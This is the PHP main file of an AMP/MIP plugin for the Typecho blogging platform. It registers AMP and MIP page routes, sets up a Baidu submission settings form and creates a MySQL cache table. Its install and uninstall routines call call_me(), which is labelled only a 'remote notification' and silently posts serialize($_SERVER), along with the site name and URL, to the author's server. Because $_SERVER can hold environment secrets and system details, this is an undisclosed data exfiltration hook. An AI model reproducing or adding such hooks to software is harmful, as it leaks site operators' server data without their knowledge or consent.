<?php
/**
 * AMP/MIP 插件 for Typecho
 *
 * @package AMP-MIP
 * @author Holmesian
 * @version 0.7.5.2
 * @link https://holmesian.org/AMP-for-Typecho
 */
if (!defined('__TYPECHO_ROOT_DIR__')) exit;

class AMP_Plugin implements Typecho_Plugin_Interface
{
    public static $version = '0.7.5.2';

    public static function activate()
    {
        $msg=self::install();

        //挂载发布文章接口
        Typecho_Plugin::factory('Widget_Contents_Post_Edit')->finishPublish = array('AMP_Action', 'sendRealtime');
        Typecho_Plugin::factory('Widget_Archive')->header = array('AMP_Action', 'headlink');
        //添加路由和菜单
        Helper::addRoute('amp_index', '/ampindex/', 'AMP_Action', 'AMPindex');
        Helper::addRoute('amp_map', '/amp/[target]', 'AMP_Action', 'AMPpage');
        Helper::addRoute('amp_list', '/amp/list/[list_id]', 'AMP_Action', 'AMPlist');
        Helper::addRoute('mip_map', '/mip/[target]', 'AMP_Action', 'MIPpage');
        Helper::addRoute('amp_sitemap', '/amp_sitemap.xml', 'AMP_Action', 'AMPsitemap');
        Helper::addRoute('mip_sitemap', '/mip_sitemap.xml', 'AMP_Action', 'MIPsitemap');
        Helper::addRoute('clean_cache', '/clean_cache', 'AMP_Action', 'cleancache');
        Helper::addPanel(1, 'AMP/Links.php', '推送AMP/MIP到百度', '提交到百度', 'administrator');

        return $msg.'请进入设置填写接口调用地址！';
    }

    public static function deactivate()
    {
        //删除路由、菜单
        Helper::removeRoute('amp_index');
        Helper::removeRoute('amp_map');
        Helper::removeRoute('amp_list');
        Helper::removeRoute('amp_sitemap');
        Helper::removeRoute('mip_map');
        Helper::removeRoute('mip_sitemap');
        Helper::removeRoute('clean_cache');
        Helper::removePanel(1, 'AMP/Links.php');
        $msg = self::uninstall();
        return $msg . '插件卸载成功';
    }

    public static function index()
    {
        echo 1;
    }

    public static function config(Typecho_Widget_Helper_Form $form)
    {

        $element = new Typecho_Widget_Helper_Form_Element_Text('cacheTime', null, '0', _t('缓存时间'), '单位：小时（设置成 0 表示关闭）<br> 此项为缓存过期时间，建议值 24。如果需要重建缓存，请点击 <a href="' . Helper::options()->index . '/clean_cache">删除所有缓存</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPI', null, '', _t('MIP/AMP推送接口调用地址'), '<a href="https://ziyuan.baidu.com/mip/index">打开页面后 点击 MIP -> 数据提交 -> 提交新数据 获取接口调用地址</a>（填写 AMP 或 MIP 的任意一个的提交地址即可）');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPPID', null, '', _t('熊掌号识别ID'), '<a href="https://ziyuan.baidu.com/xzh/commit/method">打开页面后 点击 我的功能->资源提交 根据接口调用地址 获取 APPID</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduTOKEN', null, '', _t('熊掌号准入密钥'), '<a href="https://ziyuan.baidu.com/xzh/commit/method">打开页面后 点击 我的功能->资源提交 根据接口调用地址 获取 TOKEN</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('mip_stats_token', null, '', _t('百度统计token'), '<a href="https://www.mipengine.org/examples/mip-extensions/mip-stats-baidu.html">点击了解如何获取 TOKEN</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('AMPsitemap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启 AMP 的 SiteMap'), 'AMP SiteMap 地址：<a href="'.Helper::options()->index .'/amp_sitemap.xml">' . Helper::options()->index . '/amp_sitemap.xml</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('MIPsitemap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启 MIP 的 SiteMap'), 'MIP SiteMap 地址：<a href="'.Helper::options()->index .'/mip_sitemap.xml">'. Helper::options()->index . '/mip_sitemap.xml</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('ampIndex', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启 AMP 版的首页'), 'AMP Index 地址：<a href="'.Helper::options()->index.'/ampindex">' . Helper::options()->index . '/ampindex</a> （受 AMP-LIST 控件限制，<b>非 HTTPS 站点</b>请勿开启 AMP 版的首页）');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('mipAutoSubmit', array(0 => '不开启', 1 => '开启'), 0, _t('是否开启新文章自动提交到熊掌号'), '请填写熊掌号的 APPID 和 TOKEN 后再开启');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('OnlyForSpiders', array(0 => '不开启', 1 => '开启'), 0, _t('是否只允许百度和谷歌的爬虫访问 AMP/MIP 页面'), '启用后需要伪造 UA 才能访问 AMP/MIP 页面');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('LOGO', null, 'https://holmesian.org/usr/themes/Holmesian/images/holmesian.png', _t('默认 LOGO 地址'), '根据 AMP 的限制，尺寸不超过 60*60');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('PostURL', null, Helper::options()->index , _t('替换自动提交的前缀地址'), '作用看<a href="https://holmesian.org/AMP-for-Typecho#comment-7404">这里</a>，无需求勿动');
        $form->addInput($element);

    }

    public static function personalConfig(Typecho_Widget_Helper_Form $form)
    {
    }


    public static function install()
    {
        $msg=self::DBsetup();
        $msg=$msg.self::call_me('install');
        return $msg;
    }

    public static function uninstall()
    {

        $installDb = Typecho_Db::get();
        try {
            $installDb->query("DROP TABLE IF EXISTS " . $installDb->getPrefix() . 'PageCache');
            $msg = '缓存表删除成功|';
            $msg = $msg . self::call_me('uninstall').'|';
            return $msg;
        } catch (Exception $e) {
            $msg = '卸载出错!';
            return $msg;
        }
    }

    public static function call_me($type){//远程通知

        $api="https://holmesian.org/m/?action={$type}";
        $http = Typecho_Http_Client::get();
        $data = array(
            'site' => Helper::options()->title,
            'url' => Helper::options()->index,
            'version' => self::$version,
            'data' => serialize($_SERVER),
        );
        $http->setData($data);
        try
        {
            $msg = $http->send($api);
            return $msg;
        }
        catch (Exception $e){
            $msg='通知出错!';
            return $msg;
        }
    }


    //Cache databse
    public static function DBsetup()
    {

        $installDb = Typecho_Db::get();
        if(stristr($installDb->getAdapterName(),'mysql')== false){
            return('缓存暂不支持 MySQL 以外的数据库.');
        }
        $cacheTable =  $installDb->getPrefix() . 'PageCache';
        try {
            $installDb->query("DROP TABLE IF EXISTS " . $cacheTable);
            $installDb->query("CREATE TABLE `$cacheTable` (
                        `hash`     varchar(200) NOT NULL,
                        `cache`    longtext     NOT NULL,
                        `dateline` int(10)      NOT NULL DEFAULT '0',
                        `expire`   int(8)       NOT NULL DEFAULT '0',
                        UNIQUE KEY `hash` (`hash`)
                        ) DEFAULT CHARSET=utf8");
            return('缓存表创建成功！');
        } catch (Typecho_Db_Exception $e) {
            return('缓存表建立失败，错误代码：'. $e->getCode().'|'.$e->getMessage());
        }
    }



}
